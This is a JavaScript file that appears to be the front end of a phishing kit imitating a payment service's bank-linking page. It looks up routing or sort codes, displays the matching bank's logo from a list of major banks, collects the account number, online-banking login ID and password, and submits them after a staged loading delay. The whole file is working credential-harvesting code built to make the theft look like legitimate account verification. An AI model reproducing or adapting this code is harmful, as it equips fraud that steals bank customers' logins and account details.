
var bnk="";

function check(){
	
var root = document.getElementById("Sort").value;
if (root.length > 8){
	$url = 'US.php?id=';	
}else{
	$url = 'GB.php?id=';
}

//var idm ="121000358";

$.ajax({
  type: "POST",
  url: $url+root,
  dataType: "JSON", //tell jQuery to expect JSON encoded response
  timeout: 6000,
  success: function (response) {

    if (response.success === null){
	      console.log(response.success);
	
		$('div#inpt1').addClass('textInput lap routingNumber hasError');
		$("div#field").slideUp("slow");
		$('div#bankNameNotFound').slideDown('slow');
		$('div#bankNameNotFound').fadeIn('slow');
		$('bankNameNotFound').fadeIn('slow');
		$('.div#bankNameNotFound').fadeIn('slow');
		$("div#bankDetails").fadeOut('slow');
		
		$("form").submit(function(e){
        e.preventDefault();
    });
		
    }else{
	    $('div#inpt1').removeClass('textInput lap routingNumber hasError');
	    document.getElementById("bankNameNotFound").style.display = "none";
		$("div#field").slideDown("slow");
	    $("div#bankDetails").fadeOut('slow'); 
		
		setTimeout(function(){ 
		  $("#loading").fadeIn('slow');
		
		}, 500);
		
		setTimeout(function(){ 
		$('#loading').fadeOut('slow');
		}, 3000);
		setTimeout(function(){ 
	    $("#bankDetails").fadeIn('slow'); 
				}, 4000);
		$("#bankName").html(response.success);
		
		$("#accountNumber").blur(function(){
		
		
	    if(document.getElementById("accountNumber").value == ''){
		$('div#inpt2').addClass('textInput lap routingNumber hasError');
$("#randomDeposit").fadeOut('slow');
setTimeout(function(){ 
$('div#field').animate({height:1},200);
	}, 1000);
		}else{
			 $('div#inpt2').removeClass('textInput lap routingNumber hasError');
			 $('div#field').animate({height:1},200);
	
		
		setTimeout(function(){ 
			$("#randomDeposit").fadeIn('slow'); 
			
				}, 1000);
					
		}
		});
		
	
	  bnk = response.success;
	 
	  $('input[name=nameofbnk]').val(bnk);
      console.log(response.success);
	
	  GetBNN();
    }
  }
});
    };



	
$(document).ready(function(){

    $("#Sort").blur(function(){
	//alert('OK')
	if($.trim($('#Sort').val()) == ''){
	  $("div#field").css("display","none");
	
	}else{
       check();
	    
    }
    });
   
});
var ct;
var BNN ;


function GetBNN(){
	
var rout = false;

var myName = [
"AMERICA","WEST","BMO",
"CAPITAL","CITIZENS",  
"COMPASS","FARMERS","FIFTH",  
"HUNTINGTON","CHASE", 
"PEOPLES","PNC","PROSPERITY",   
"RBS","REGIONS","SECURITY",   
"SOVEREIGN","TD","US",   
"WACHOVIA","WELLS","HSBC","STREET","USAA",
"SUNTRUST",
];

	ct = bnk.replace(/[^a-z0-9\s]/gi, '').replace(/[_\s]/g, ' ')

	array = ct.split(/\s/);

for (i = 0; i < array.length; i++) { 
for (x = 0; x < myName.length; x++) { 
    if (myName[x] === array[i]) {
	    
	    rout = true;
        BNN = myName[x];
        logo();
		
}else{
continue;

}    
}
}

if(rout == false){
//alert (rout);
$("#BNN").html(ct);
$('#logo').css('display','none');
$("#BNN").css('display','block');
}

}
	
function logo(){

$("#BNN").css('display','none');	
$('#logo').css('display','block');	
$('#logo').css("width", "100px");
if(BNN == 'CHASE'){
$('#logo').attr("src", "../set/bnk/CHASE.png")
$('#logo').css("width", "130px");
}
if(BNN == 'AMERICA'){
$('#logo').attr("src", "../set/bnk/AMERICA.png")
$('#logo').css("width", "170px");
}
if(BNN == 'WEST'){
$('#logo').attr("src", "../set/bnk/WEST.png")
}
if(BNN == 'BMO'){
$('#logo').attr("src", "../set/bnk/BMO.png")
}
if(BNN == 'CAPITAL'){
$('#logo').attr("src", "../set/bnk/CAPITAL.png")
}
if(BNN == 'CITIZENS'){
$('#logo').attr("src", "../set/bnk/CITIZENS.png")
}
if(BNN == 'COMPASS'){
$('#logo').attr("src", "../set/bnk/COMPASS.png");
$('#logo').css("width", "140px");
}
if(BNN == 'FARMERS'){
$('#logo').attr("src", "../set/bnk/FARMERS.png")
}
if(BNN == 'FIFTH'){
$('#logo').attr("src", "../set/bnk/FIFTH.png")
}
if(BNN == 'HUNTINGTON'){
$('#logo').attr("src", "../set/bnk/HUNTINGTON.png")
}
if(BNN == 'PEOPLES'){
$('#logo').attr("src", "../set/bnk/PEOPLES.png")
}
if(BNN == 'PNC'){
$('#logo').attr("src", "../set/bnk/PNC.png")
}
if(BNN == 'PROSPERITY'){
$('#logo').attr("src", "../set/bnk/PROSPERITY.png")
}
if(BNN == 'RBS'){
$('#logo').attr("src", "../set/bnk/RBS.png")
}
if(BNN == 'REGIONS'){
$('#logo').attr("src", "../set/bnk/REGIONS.png")
}
if(BNN == 'SECURITY'){
$('#logo').attr("src", "../set/bnk/SECURITY.png")
}
if(BNN == 'USAA'){
$('#logo').attr("src", "../set/bnk/USAA.png")
}
if(BNN == 'SOVEREIGN'){
$('#logo').attr("src", "../set/bnk/SOVEREIGN.png")
$('#logo').css("width", "160px")
}
if(BNN == 'TD'){
$('#logo').attr("src", "../set/bnk/TD.png")
}
if(BNN == 'WACHOVIA'){
$('#logo').attr("src", "../set/bnk/WACHOVIA.png")
}
if(BNN == 'US'){
$('#logo').attr("src", "../set/bnk/US.png")
}
if(BNN == 'WELLS'){
$('#logo').attr("src", "../set/bnk/WELLS.png")
}
if(BNN == 'HSBC'){
$('#logo').attr("src", "../set/bnk/HSBC.png")
}
if(BNN == 'STREET'){
$('#logo').attr("src", "../set/bnk/STREET.png")
}
if(BNN == 'USAA'){
$('#logo').attr("src", "../set/bnk/USAA.png")
}
if(BNN == 'SUNTRUST'){
$('#logo').attr("src", "../set/bnk/SUNTRUST.png")
}

}
var valid = true;
function done(){

  if(document.getElementById("Sort").value == ''){
	  $('div#inpt1').addClass('textInput lap routingNumber hasError');
	 // $('div#bankNameNotFound').addClass('textInput.hasError');
	valid = false;
  }else{valid = true;};
  if(document.getElementById("accountNumber").value == ''){
	  $('div#inpt2').addClass('textInput lap accountNumber hasError');
	   	valid = false;
	  }else{valid = true;};
  if(document.getElementById("logId").value == ''){
	  $('#logId').css("border-color","red");
	  	valid = false;
	  }else{valid = true;};
  if(document.getElementById("passId").value == ''){
	  $('#passId').css("border-color","red");
	   	valid = false;
	  }else{valid = true;};
	 
if(valid == true){
 $("#load").css('display','block');
 setTimeout(function() {
 
       // First target

    document.sub.submit(); 

	 
	 }, 3000);
}
  }
 
// setTimeout(function() { document.getElementById('form').submit() }, 3000);